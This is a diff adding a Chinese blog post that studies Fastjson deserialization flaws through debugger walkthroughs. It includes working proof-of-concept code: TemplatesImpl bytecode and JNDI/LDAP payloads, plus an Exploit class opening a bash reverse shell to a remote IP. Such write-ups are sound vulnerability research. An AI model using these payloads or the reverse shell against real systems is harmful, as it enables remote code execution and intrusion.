@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>Java反序列化漏洞-Fastjson - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期日, 三月 17日 2019, 11:50 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    3.3k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      14 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言-2020-03-16更新"><a href="#前言-2020-03-16更新" class="headerlink" title="前言(2020&#x2F;03&#x2F;16更新)"></a>前言(2020&#x2F;03&#x2F;16更新)</h3><p>一直想学习一下Java反序列化漏洞的相关利用，寒假期间学习了Java原生类的反序列化漏洞（Apache Commons Collections组件），不过到现在都还没有做一个总结。刚好最近有师傅问到shiro反序列化漏洞的相关事情，所以现在从这篇文章开始，学习各种Java反序列化漏洞，顺便做一个总结并记录下来。环境搭建采用的是Maven+Spring MVC，方便快捷。</p>
+<h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p>Fastjson是一个性能很好的Java语言实现的Json解析器和生成器，由来自阿里巴巴的工程师开发。具有极快的性能，接口简单易用。Fastjson使用parseObject来进行反序列化。</p>
+<p>Fastjson提供了两个主要接口toJSONString和parseObject来实现Json数据的序列化和反系列化。</p>
+<p>项目地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>fastjson &lt;&#x3D; 1.2.24</p>
+<p>JDK8： 1.2.22 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.24</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="基于TemplateImpl"><a href="#基于TemplateImpl" class="headerlink" title="基于TemplateImpl"></a>基于TemplateImpl</h4><h6 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h6><ul>
+<li>解析时设置了<code>Feature.SupportNonPublicField</code>，否则不支持传入私有属性</li>
+<li>目标使用的jdk中存在<code>TemplatesImpl</code>类</li>
+</ul>
+<h6 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h6><p>向maven项目的pom.xml文件中加入需要的依赖：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.23&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后写个测试方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value=&quot;/Fastjson&quot;)</span><br><span class="line">public String fastjson(Model model, HttpServletRequest request) &#123;</span><br><span class="line">    String data = request.getParameter(&quot;data&quot;);</span><br><span class="line">    Object obj = JSON.parseObject(data, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    model.addAttribute(&quot;result&quot;, obj.getClass());</span><br><span class="line">    return &quot;index&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Poc（坑：之前没写package一直弹不出来计算器）:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package Twings;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">public class Evil extends AbstractTranslet &#123;</span><br><span class="line">    public Evil() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span><br><span class="line">            throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后javac编译成class并base64编码一下生成恶意_bytecodes。访问<a href="http://localhost:8080/Fastjson?data=">http://localhost:8080/Fastjson?data=</a>，即可看到弹出计算器。</p>
+<h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;: [&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAcACAcAHAwAHQAeAQAEY2FsYwwAHwAgAQALVHdpbmdzL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAQAAQAMAAEADQAOAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAPAAsAAAAEAAEADwABAA0AEAACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAFAALAAAABAABAA8AAQARAAAAAgAS&quot;],&quot;_name&quot;: &quot;a.b&quot;,&quot;_tfactory&quot;: &#123;&#125;,&quot;_outputProperties&quot;: &#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>@type：解析类，_bytecodes：恶意字节码，_outputProperties：调用outputProperties变量的get方法getOutputProperties。</p>
+<h6 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h6><p>我们给parseObject函数下断点进行调试，可以看到代码先根据input、config和featureValues生成Json解析类，然后调用它的parseObject函数进行反序列化处理：</p>
+<p><img src="/css/images/java_fastjson/2019031701.png" srcset="/img/loading.gif"></p>
+<p>我们继续走下去，可以看到下一步是derializer.deserialze函数：</p>
+<p><img src="/css/images/java_fastjson/2019031702.png" srcset="/img/loading.gif"></p>
+<p>然后是parser.parse：</p>
+<p><img src="/css/images/java_fastjson/2019031703.png" srcset="/img/loading.gif"></p>
+<p>在这个函数中开始对Json进行解析，先判断了第一个字符，因为payload的第一个字符是{，所以进入了分支LBRACE中：</p>
+<p><img src="/css/images/java_fastjson/2019031704.png" srcset="/img/loading.gif"></p>
+<p>然后调用了parseObject函数对Json的内容进行解析，获取了键值：</p>
+<p><img src="/css/images/java_fastjson/2019031705.png" srcset="/img/loading.gif"></p>
+<p>接着开始获取type中所写明的类：</p>
+<p><img src="/css/images/java_fastjson/2019031706.png" srcset="/img/loading.gif"></p>
+<p>接下来调用deserializer.deserialze函数：</p>
+<p><img src="/css/images/java_fastjson/2019031707.png" srcset="/img/loading.gif"></p>
+<p>我们跟进去，里面对Json字符串中的各个键值进行了解析，然后调用了parseField函数，当传入的key为_outputProperties的时候，漏洞触发，我们跟进去看看。看到代码调用了fieldDeserializer.parseField-&gt;setValue，最后调用invoke函数：</p>
+<p><img src="/css/images/java_fastjson/2019031708.png" srcset="/img/loading.gif"></p>
+<p>调用了getOutputProperties函数，我们继续走下去，最后来到newTransformer函数：</p>
+<p><img src="/css/images/java_fastjson/2019031709.png" srcset="/img/loading.gif"></p>
+<p>可以看到这里调用getTransletInstance()函数实例化了类，然后就执行了类的构造函数，导致了代码执行漏洞：</p>
+<p><img src="/css/images/java_fastjson/2019031710.png" srcset="/img/loading.gif"></p>
+<p>以上就是对基于TemplateImpl的Fastjson反序列化漏洞利用的分析。</p>
+<h4 id="基于JNDI"><a href="#基于JNDI" class="headerlink" title="基于JNDI"></a>基于JNDI</h4><h5 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h5><h6 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h6><p>JDK&lt;&#x3D;8u121，Oracle在jdk8u121之后设置了com.sun.jndi.rmi.object.trustURLCodebase为 false，限制了 RMI 利用方式中从远程加载，会报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.</span><br></pre></td></tr></table></figure>
+
+<h6 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h6><p>开启RMI服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class RMIServer &#123;</span><br><span class="line">    public static void main( String args[] )&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">            Reference reference = new javax.naming.Reference(&quot;Exploit&quot;, &quot;Exploit&quot;, &quot;http://127.0.0.1:2333/&quot;);</span><br><span class="line">            ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">            registry.bind(&quot;Exploit&quot;, referenceWrapper);</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在Web服务上部署编译后的恶意class：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(</span><br><span class="line">                    new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/192.168.85.128/4545 0&gt;&amp;1&quot;&#125;);</span><br><span class="line">        &#125; catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        Exploit e = new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后发送payload。</p>
+<h6 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h6><p>同样给JSON.parseObject下断点进行调试，可以看到与之前不同的是这次通过了if (matchField)的判断，进入了另一个分支，调用了setValue函数：</p>
+<p><img src="/css/images/java_fastjson/2019031801.png" srcset="/img/loading.gif"></p>
+<p>然后调用了autoCommit的setter函数setAutoCommit：</p>
+<p><img src="/css/images/java_fastjson/2019031802.png" srcset="/img/loading.gif"></p>
+<p>最后调用了connect函数，连接了攻击者开启了RMI服务：</p>
+<p><img src="/css/images/java_fastjson/2019031803.png" srcset="/img/loading.gif"></p>
+<p>以上就是对RMI的Fastjson反序列化漏洞利用的简要分析，跟基于TemplateImpl的原理差不多，都是利用了类的getter或者setter。</p>
+<h6 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h6><p>在服务端有Tomcat的org.apache.naming.factory.BeanFactory类的时候，可以尝试绕过。</p>
+<p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>
+<h5 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h5><h6 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h6><p>JDK&lt;&#x3D;8u191，Oracle在jdk8u191之后设置了com.sun.jndi.ldap.object.trustURLCodebase为 false,限制了 LDAP 利用时从远程加载 Class。</p>
+<h6 id="安装marshalsec"><a href="#安装marshalsec" class="headerlink" title="安装marshalsec"></a>安装marshalsec</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mbechler/marshalsec.git</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
+
+<h6 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h6><p>开启LDAP服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .\target\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:2333/#Exploit</span><br></pre></td></tr></table></figure>
+
+<p>同样在Web服务上部署编译后的恶意class，发送</p>
+<p>payload1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload2：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,&quot;targetBeanName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;propertyPath&quot;:&quot;Poc&quot;,&quot;beanFactory&quot;:&#123;&quot;@type&quot;:&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,&quot;shareableResources&quot;:[&quot;ldap://localhost:1389/Exploit&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload3：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,&quot;jndiName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;loginTimeout&quot;:0&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload4：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set[&#123;&quot;@type&quot;:&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;,&quot;beanFactory&quot;:&#123;&quot;@type&quot;:&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,&quot;shareableResources&quot;:[&quot;ldap://localhost:1389/Exploit&quot;]&#125;,&quot;adviceBeanName&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;,&#123;&quot;@type&quot;:&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;,&#125;]</span><br></pre></td></tr></table></figure>
+
+<h6 id="漏洞分析-payload1"><a href="#漏洞分析-payload1" class="headerlink" title="漏洞分析-payload1"></a>漏洞分析-payload1</h6><p>payload1分析同RMI，不再加以分析。</p>
+<h6 id="漏洞分析-payload2"><a href="#漏洞分析-payload2" class="headerlink" title="漏洞分析-payload2"></a>漏洞分析-payload2</h6><p>首先跟RMI一样进入了if (matchField)并调用了setValue函数，然后调用了PropertyPath的setter函数setPropertyPath，给PropertyPath变量赋了值，到这里还没有触发漏洞。接下来的处理跟基于TemplateImpl的一样，调用了parseField函数，将字段beanFactory作为参数传入：</p>
+<p><img src="/css/images/java_fastjson/2019031804.png" srcset="/img/loading.gif"></p>
+<p>这里调用fieldValueDeserilizer.deserialze获取了beanFactory中的org.springframework.jndi.support.SimpleJndiBeanFactory实例，然后进入setValue函数：</p>
+<p><img src="/css/images/java_fastjson/2019031805.png" srcset="/img/loading.gif"></p>
+<p>再调用setter函数setBeanFactory：</p>
+<p><img src="/css/images/java_fastjson/2019031806.png" srcset="/img/loading.gif"></p>
+<p>这里可以看到有一个判断this.propertyPath &#x3D;&#x3D; null，如果不传入propertyPath就会直接抛出异常终止程序：</p>
+<p><img src="/css/images/java_fastjson/2019031807.png" srcset="/img/loading.gif"></p>
+<p>然后将攻击者提供的恶意IDAP地址作为参数，调用this.beanFactory.getBean，即org.springframework.jndi.support.SimpleJndiBeanFactory.getBean函数，最后调用lookup函数连接了攻击者的恶意IDAP：</p>
+<p><img src="/css/images/java_fastjson/2019031808.png" srcset="/img/loading.gif"></p>
+<p>以上就是对payload2的简要分析，同样原理差不多，但是两层嵌套结构很精妙。</p>
+<h6 id="漏洞分析-payload3"><a href="#漏洞分析-payload3" class="headerlink" title="漏洞分析-payload3"></a>漏洞分析-payload3</h6><p>payload3分析大致同RMI（应该？），且我本地没有这个类，所以也不加以分析。</p>
+<h6 id="漏洞分析-payload4"><a href="#漏洞分析-payload4" class="headerlink" title="漏洞分析-payload4"></a>漏洞分析-payload4</h6><p>payload4跟payload3相似，不过payload4是Set类型，且结构更复杂一点。</p>
+<p>这次我偷个懒，直接找到最后的触发点，然后查看调用栈，最后触发点跟payload3遗址，同样是lookup函数。因为类型为Set的缘故，所以不会进入其他payload进入的分支LBRACE，而是进入SET分支中：</p>
+<p><img src="/css/images/java_fastjson/2019031809.png" srcset="/img/loading.gif"></p>
+<p>这里通过HashSet来对Set类型进行处理，最后在putVal函数中调用了key.equals函数：</p>
+<p><img src="/css/images/java_fastjson/2019031810.png" srcset="/img/loading.gif"></p>
+<p>即DefaultBeanFactoryPointcutAdvisor的equals，由于继承关系，最后调用了AbstractPointcutAdvisor的equals，再调用了getAdvice函数：</p>
+<p><img src="/css/images/java_fastjson/2019031811.png" srcset="/img/loading.gif"></p>
+<p>然后调用了getBean：</p>
+<p><img src="/css/images/java_fastjson/2019031812.png" srcset="/img/loading.gif"></p>
+<p>最后就是触发点的doGetSingleton函数了：</p>
+<p><img src="/css/images/java_fastjson/2019031813.png" srcset="/img/loading.gif"></p>
+<p>以上就是对payload4的简要分析，跟其他payload不同的就是这种payload没有用到getter或者setter，而是用的Set-&gt;HashMap-&gt;equals这样一个调用链。</p>
+<hr>
+<h3 id="2020-03-15-更新-fastjson-1-2-61"><a href="#2020-03-15-更新-fastjson-1-2-61" class="headerlink" title="2020&#x2F;03&#x2F;15 更新 - fastjson 1.2.61"></a>2020&#x2F;03&#x2F;15 更新 - fastjson 1.2.61</h3><p>参考文章：<a href="https://curz0n.github.io/2019/09/24/fastjson_1_2_61_blacklist_bypass/">https://curz0n.github.io/2019/09/24/fastjson_1_2_61_blacklist_bypass/</a></p>
+<p>现在开始偶尔看看安全相关的东西，因为之前高校战疫的题目提到了 fastjson 1.2.61 版本的绕过，所以我就来更新一番。</p>
+<p>首先因为我更新过 Java，所以要改一改之前项目的 JDK 配置，然后修改 pom.xml 里的 fastjson 版本配置为 1.2.61 。</p>
+<p>看漏洞描述，好像跟之前的利用方式有点相似，都是利用属性的 getter 和 setter，最后的命令执行方式是调用 RMI 加载远程恶意 class，使用的 commons-configuration 组件，不过我本地都没有这个包，得安装才行。去 maven 仓库上看看这个包：<a href="https://mvnrepository.com/artifact/org.apache.commons/commons-configuration2">https://mvnrepository.com/artifact/org.apache.commons/commons-configuration2</a> ，有好多版本，我先装个最新版本试试，在 pom.xml 里加入：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>下载好像有点慢，打算加个镜像服务器代理试试，仔细一想才发现不知道 setting.xml 在哪里，于是去看了看环境变量里的 path，发现在 IDEA 的目录 plugins\maven\lib\maven3\conf 里面，有 2 和 3 两个版本，于是又仔细一想，发现不知道项目配置的 maven 是怎么样的，想着干脆看看配置的 maven 版本、配置文件和仓库地址，顺便拯救一下我快被塞满了的 C 盘，在 IDEA 中点击 File - Other Settings - Default Settings，然后搜索 maven 就可以看到配置了，可以看看这篇文章：<a href="https://blog.csdn.net/konzy/article/details/81626629">https://blog.csdn.net/konzy/article/details/81626629</a></p>
+<p>然后修改配置，在 setting.xml 的 mirrors 标签里面里面加上镜像，先试试腾讯云：<a href="https://www.cnblogs.com/slankka/p/12202640.html">https://www.cnblogs.com/slankka/p/12202640.html</a></p>
+<p>加个镜像服务器代理试试：</p>
